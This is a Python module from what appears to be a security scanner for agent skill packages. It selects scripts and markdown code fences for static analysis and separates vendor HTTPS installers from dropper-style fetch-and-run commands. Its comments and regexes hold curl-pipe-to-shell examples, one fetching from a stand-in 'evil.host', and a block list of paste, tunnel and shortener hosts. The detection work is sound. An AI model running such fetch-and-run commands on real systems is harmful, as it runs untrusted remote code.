"""Select executable files and instruction fences once for all code engines."""

from __future__ import annotations

import re
import shlex
from dataclasses import dataclass

from ..findings import Finding
from ..parse import MAX_PY_CHARS
from ._pyast import parse as parse_python

_FENCE_LANG = {
    "bash": ("shell", "bash"), "sh": ("shell", "sh"),
    "shell": ("shell", "sh"), "zsh": ("shell", "zsh"),
    "console": ("shell", "sh"), "shell-session": ("shell", "sh"),
    "shellsession": ("shell", "sh"), "shell-script": ("shell", "sh"),
    "sh-session": ("shell", "sh"), "bash-session": ("shell", "bash"),
    "ksh": ("shell", "ksh"), "dash": ("shell", "dash"),
    "fish": ("shell", "fish"), "powershell": ("shell", "powershell"),
    "pwsh": ("shell", "powershell"), "ps1": ("shell", "powershell"),
    "bat": ("shell", "cmd"), "cmd": ("shell", "cmd"),
    "batch": ("shell", "cmd"), "python": ("python", "python"),
    "py": ("python", "python"), "python3": ("python", "python"),
    "python2": ("python", "python"), "ipython": ("python", "python"),
}
_CONSOLE_PROMPT_RE = re.compile(r"^\s{0,3}\$\s+")
_SCRIPT_KINDS = {"script_shell", "script_python"}
_SUPPORTED_SHELL_DIALECTS = {"bash", "sh", "dash"}


@dataclass(frozen=True)
class CodeUnit:
    rel: str
    kind: str
    text: str
    origin: str = "file"
    dialect: str | None = None


def _parent(rel: str) -> str:
    return rel.rsplit("/", 1)[0] if "/" in rel else ""


def _manifest_index(parsed):
    index = {}
    for artifact in parsed.artifacts:
        if artifact.kind == "skill_manifest":
            index.setdefault(_parent(artifact.rel), artifact)
    return index


def _governing_manifest(index, rel: str):
    directory = _parent(rel)
    while True:
        if directory in index:
            return index[directory]
        if not directory:
            return None
        directory = _parent(directory)


def _fence_lang(info: str):
    parts = info.split()
    if not parts:
        return None
    match = re.search(r"[A-Za-z0-9_+-]+", parts[0])
    return _FENCE_LANG.get(match.group(0).lower()) if match else None


def _shell_dialect(rel: str, text: str) -> str:
    first = text.split("\n", 1)[0].lower()
    match = re.match(r"^#!.*\b(bash|sh|dash|ksh|zsh|fish)\b", first)
    if match:
        return match.group(1)
    suffix = rel.rsplit(".", 1)[-1].lower() if "." in rel else ""
    return {"bash": "bash", "zsh": "zsh", "sh": "sh"}.get(suffix, "sh")


def _python_is_module(source: str) -> bool:
    if len(source) > MAX_PY_CHARS:
        return True
    try:
        parse_python(source)
    except (SyntaxError, ValueError, RecursionError, MemoryError):
        return False
    return True


def _pad_blocks(blocks) -> str:
    lines = []
    for marker_line, body_lines in blocks:
        while len(lines) < marker_line:
            lines.append("")
        lines.extend(body_lines)
    return "\n".join(lines)


def _lift_fences(fences):
    """Combine supported executable fences without changing their line numbers."""
    kept = {}
    for info, content, marker_line in fences:
        classified = _fence_lang(info)
        if classified is None:
            continue
        language, dialect = classified
        if language == "shell" and dialect not in _SUPPORTED_SHELL_DIALECTS:
            continue
        lines = content.split("\n")
        if lines and lines[-1] == "":
            lines.pop()
        if language == "shell":
            lines = [
                _CONSOLE_PROMPT_RE.sub(lambda match: " " * len(match.group(0)), line)
                for line in lines
            ]
        elif not _python_is_module("\n".join(lines)):
            continue
        block = marker_line, lines
        kept.setdefault(language, []).append(block)
    output = []
    for language, blocks in kept.items():
        combined = _pad_blocks(blocks)
        if language == "shell" or _python_is_module(combined):
            output.append((language, "bash" if language == "shell" else language, combined))
        else:
            output.extend((language, language, _pad_blocks([block])) for block in blocks)
    return output


def _unsupported_shell(
    rel: str, dialect: str, origin: str, line: int | None = None,
) -> Finding:
    return Finding(
        vector="",
        rule="analysis-incomplete",
        severity="high",
        path=rel,
        line=line,
        message="OpenGrep does not support executable %s code." % dialect,
        evidence={"reason": "unsupported_language", "language": dialect, "origin": origin},
    )


def build_code_lane(parsed) -> tuple[list[CodeUnit], list[Finding]]:
    """Return real scripts, executable fences, and fail-visible coverage notes."""
    units = []
    notes = []
    for artifact in parsed.artifacts:
        if artifact.kind not in _SCRIPT_KINDS or artifact.text is None:
            continue
        dialect = _shell_dialect(artifact.rel, artifact.text) \
            if artifact.kind == "script_shell" else None
        if dialect and dialect not in _SUPPORTED_SHELL_DIALECTS:
            notes.append(_unsupported_shell(artifact.rel, dialect, "file"))
            continue
        units.append(CodeUnit(
            artifact.rel,
            artifact.kind,
            artifact.text,
            dialect=dialect,
        ))
    for artifact in parsed.artifacts:
        if artifact.kind not in ("skill_manifest", "instruction", "agent_identity"):
            continue
        if not artifact.markdown or not artifact.markdown.fences:
            continue
        for info, content, marker_line in artifact.markdown.fences:
            classified = _fence_lang(info)
            if (classified and classified[0] == "shell"
                    and classified[1] not in _SUPPORTED_SHELL_DIALECTS):
                notes.append(_unsupported_shell(
                    artifact.rel, classified[1], "fence", marker_line + 1,
                ))
            if classified and classified[0] == "python" and not _python_is_module(content):
                notes.append(Finding(
                    vector="",
                    rule="analysis-incomplete",
                    severity="high",
                    path=artifact.rel,
                    line=marker_line + 1,
                    message="Python fence could not be parsed, so it was not analysed.",
                    evidence={"language": info.split()[0], "origin": "fence"},
                ))
        for language, dialect, source in _lift_fences(artifact.markdown.fences):
            units.append(CodeUnit(
                artifact.rel,
                "script_" + language,
                source,
                origin="fence",
                dialect=dialect,
            ))
    return units, notes


# --- first-party installer idiom ---------------------------------------------------------
# `curl -fsSL https://cli.vendor.com/install.sh | sh` installs the tool a skill wraps: an unpinned
# remote install worth reporting, not a dropper. Recognised narrowly -- HTTPS, a named host with
# an installer-shaped path (or the bare vendor host), no TLS bypass, no paste/tunnel/shortener
# host, no raw IP, no unresolved variable -- and anything outside that shape keeps dropper severity.
_INSTALLER_URL_RE = re.compile(
    r"https://(?P<host>[a-z0-9](?:[a-z0-9-]*[a-z0-9])?(?:\.[a-z0-9](?:[a-z0-9-]*[a-z0-9])?)+)"
    r"(?::\d+)?(?P<path>/[^\s'\"|;&`)<>]*)?", re.I)
_INSTALLER_PATH_RE = re.compile(
    r"(?:^|/)(?:install(?:er)?(?:\.(?:sh|bash|py))?|setup(?:\.sh)?|get(?:-[\w-]+)?(?:\.sh)?|"
    r"bootstrap(?:\.sh)?|latest|download(?:/[\w.-]+)*|releases?(?:/[\w.-]+)*)$", re.I)
_DROP_HOST_RE = re.compile(
    r"(?:^|\.)(?:pastebin\.com|paste\.ee|hastebin\.com|ghostbin\.\w+|rentry\.co|transfer\.sh|"
    r"0x0\.st|file\.io|anonfiles\.com|gofile\.io|mega\.nz|ngrok(?:-free)?\.(?:io|app|dev)|"
    r"trycloudflare\.com|loca\.lt|serveo\.net|localhost\.run|discordapp\.(?:com|net)|"
    r"ipfs\.io|dweb\.link|bit\.ly|tinyurl\.com|t\.co|goo\.gl|is\.gd|cutt\.ly|rb\.gy|"
    r"gist\.githubusercontent\.com|gist\.github\.com|termbin\.com|dpaste\.\w+)$", re.I)
# A TLS bypass in any spelling, including a clustered short flag (`-sk`, `-fsSLk`) or a config
# file (`-K`, `--config`) that can carry `insecure`: never part of a first-party installer.
_INSECURE_FLAG_RE = re.compile(
    r"(?<![\w-])(?:--insecure|--no-check-certificate|--check-certificate=(?:false|no|0)|"
    r"--verify[= ](?:no|false|0)|--config(?:=\S+)?|-[A-Za-z]*[kK][A-Za-z]*)(?![\w-])")
# An interpreter running inline code as the consumer (`| python -c 'exec(open(0).read())'`) is a
# dropper shape; vendor installers pipe into a shell or into `python3 -`.
_INLINE_CODE_CONSUMER_RE = re.compile(
    r"\b(?:python[0-9.]*|perl|ruby|node|php)\b[^|;&\n]{0,40}?\s-[A-Za-z]*[ce]\b")
# A schemeless host among the fetch operands (`curl -H 'X: https://vendor/install.sh'
# evil.host/p`) means the counted URL is not what is fetched.
_BARE_HOST_RE = re.compile(
    r"^(?:(?:[a-z0-9-]+\.)+[a-z]{2,}|\d{1,3}(?:\.\d{1,3}){3}|localhost|\[[0-9a-f:.]+\])"
    r"(?::\d+)?(?:/\S*)?$", re.I)
# Any URL scheme, for counting. The idiom is exactly ONE URL, the fetch operand: a header value,
# a docs link on the same line or a second command each add a URL and disqualify the shape.
_ANY_URL_RE = re.compile(r"[a-z][a-z0-9+.-]*://[^\s'\"|;&`)<>]+", re.I)
# Command or process substitution or a shell variable anywhere in the FETCH (before the first
# unquoted pipe) means the bytes run are not the URL as written. Text after the pipe (`| bash &&
# export PATH=$HOME/...`) is fine. `sh <(curl -L https://vendor/install)` is unwrapped first so the
# fetch itself is what gets judged.
_SUBSTITUTION_RE = re.compile(r"[`$]|[<>]\(")
_PROCESS_SUB_FETCH_RE = re.compile(r"^\s*(?:sudo\s+)?(?:sh|bash|zsh|dash|ksh)\s+<\((.*)\)\s*$",
                                   re.S)
# RFC 2606/6761 reserved names and loopback: a placeholder host is nobody's vendor domain, so an
# install piped from it is not a first-party installer.
_PLACEHOLDER_HOST_RE = re.compile(
    r"(?:^|\.)example\.(?:com|net|org)$|\.(?:example|test|invalid|localhost|local)$|^localhost$",
    re.I)


def _fetch_text(text):
    """The fetch command up to the first pipe that is neither quoted nor escaped, quotes kept;
    None when a quote is left open, which the caller treats as not a first-party installer."""
    quote = None
    i = 0
    while i < len(text):
        ch = text[i]
        if ch == "\\" and quote != "'":
            i += 2
            continue
        if quote is None and ch in "'\"":
            quote = ch
        elif ch == quote:
            quote = None
        elif quote is None and ch == "|":
            return text[:i]
        i += 1
    return None if quote else text


def installer_idiom(command_text) -> bool:
    """True when a fetch-and-run command is a first-party HTTPS installer, see above."""
    text = command_text or ""
    unwrapped = _PROCESS_SUB_FETCH_RE.match(text)
    if unwrapped:
        text = unwrapped.group(1)
    fetch = _fetch_text(text)
    if fetch is None or _INSECURE_FLAG_RE.search(fetch) or _SUBSTITUTION_RE.search(fetch):
        return False
    if _INLINE_CODE_CONSUMER_RE.search(text[len(fetch):]):
        return False
    urls = _ANY_URL_RE.findall(text)
    if len(urls) != 1:                                 # header/docs URL or a second command
        return False
    try:
        tokens = shlex.split(fetch)
    except ValueError:
        return False
    operands = [t.strip("()<>") for t in tokens[1:] if not t.startswith("-")]
    if operands.count(urls[0]) != 1:                   # the URL sits inside an option value
        return False
    if any(_BARE_HOST_RE.match(t) for t in operands if t != urls[0]):
        return False                                   # something else is fetched
    match = _INSTALLER_URL_RE.fullmatch(urls[0])      # https only; the host class cannot span
    if match is None:                                  # '@', so `vendor@evil.host` fails here
        return False
    host, path = match.group("host").lower(), (match.group("path") or "/")
    if (re.fullmatch(r"[\d.]+", host) or _DROP_HOST_RE.search(host)
            or _PLACEHOLDER_HOST_RE.search(host)):
        return False
    if "$" in path or "{" in path or "%" in path:
        return False
    path = path.split("?", 1)[0].split("#", 1)[0]     # the query is not the fetched path
    stripped = path.rstrip("/")                        # bare vendor host serves the installer
    return stripped == "" or bool(_INSTALLER_PATH_RE.search(stripped))
